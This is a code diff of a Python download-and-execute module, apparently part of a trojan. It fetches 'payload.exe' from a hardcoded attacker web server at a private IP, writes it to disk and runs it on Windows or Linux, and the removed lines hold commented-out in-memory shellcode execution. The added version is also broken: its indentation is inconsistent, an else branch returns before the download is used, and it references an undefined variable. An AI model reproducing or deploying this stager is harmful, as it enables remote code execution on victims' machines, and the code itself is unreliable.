@@ -16,13 +16,57 @@ try:
   import urllib3 
 except:
   os.system("pip install urllib3")
+  time.sleep(5)
   import urllib3
 
 # retrieve the shellcode from our web server
-url = "http://172.16.222.144:8000/payload.exe" #"https://dc619.4shared.com/img/mSMvaperce/s23/1542cfad648/Dragon_Ball_Z_Shin_Budokai_2" #
+url = "http://172.16.222.149:8000/payload.exe" #"https://dc619.4shared.com/img/mSMvaperce/s23/1542cfad648/Dragon_Ball_Z_Shin_Budokai_2" #
 bin = True
-OsTargetpath = "test.exe"
+OsTargetpath = "payload.exe"
 start = True
+
+def run(**args):
+	print("[*] In getFileFromURI module.") #Todelete
+  response=""
+  #while not is_connected(): #if the tro execute this, so it is connected
+  #time.sleep(20)
+  try:
+    http = urllib3.PoolManager()
+    r = http.request('GET', url)
+  except urllib3.exceptions.MaxRetryError:
+  	os.system("echo 'getFileFromURI: HTTP Error 404: File not found' >> Tapalog.log")
+  	return "getFileFromURI: HTTP Error 404: File not found"
+  except urllib3.exceptions.URLError: 
+  	os.system("echo '<urlopen error [Errno 111] Connection refused>' >> Tapalog.log")
+  	return "getFileFromURI: Connection refused"
+  else:
+  	return "getFileFromURI: Connexion error"
+  # decode the shellcode from base64
+  shellcode = r.data  ####shellcode = base64.b64decode(r.data)
+  
+  if bin:
+    mon_fichier = open(OsTargetpath, "wb")
+    mon_fichier.write(shellcode.__str__())
+  	mon_fichier.close()
+  else:
+    mon_fichier = open(OsTargetpath, "w")
+		mon_fichier.write(shellcode.__str__())
+		mon_fichier.close()
+  if start and os.name == 'nt':
+          os.system("start {}".format(OsTargetpath))
+  elif start and os.name == 'posix':
+          os.system("chmod 777 {}".format(OsTargetpath))
+          os.system("./{}".format(OsTargetpath))
+  else:
+          os.system("echo 'Non-recognized OS' >> Tapalog.log")
+      
+  time.sleep(5)
+  return str("getFileFromURI: file {} successfully started".format(filePath))
+
+
+
+
+
 
 import socket
 REMOTE_SERVER = "www.google.com"
@@ -36,38 +80,4 @@ def is_connected(hostname):
   except:
      pass
   return False
-
-def run(**args):
-          response=""
-          while not is_connected(): 
-                  time.sleep(20)
-          try:
-            http = urllib3.PoolManager()
-            r = http.request('GET', url)
-          except urllib3.exceptions.MaxRetryError:
-          	os.system("echo 'getFileFromURI: HTTP Error 404: File not found' >> Tapalog.log")
-          except urllib3.exceptions.URLError: 
-          	os.system("echo '<urlopen error [Errno 111] Connection refused>' >> Tapalog.log")
-          # decode the shellcode from base64
-          shellcode = r.data  ####shellcode = base64.b64decode(r.data)
-          #shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))
-          #shellcode_func = ctypes.cast(ctypes.byref(shellcode_buffer), ctypes.CFUNCTYPE(ctypes.c_void_p))
-          #shellcode_func() #==> Acces violationm seg fault
-          
-          if bin:
-                  mon_fichier = open(OsTargetpath, "wb")
-          else:
-                  mon_fichier = open(OsTargetpath, "w")
-          mon_fichier.write(shellcode)
-          mon_fichier.close()
-          if start and os.name == 'nt':
-                  os.system("start {}".format(OsTargetpath))
-          elif start and os.name == 'posix':
-                  os.system("chmod 777 {}".format(OsTargetpath))
-                  os.system("./{}".format(OsTargetpath))
-          else:
-                  os.system("echo 'Non-recognized OS' >> Tapalog.log")
-          time.sleep(5)
-          #os.system("del fichier.exe")
-
 
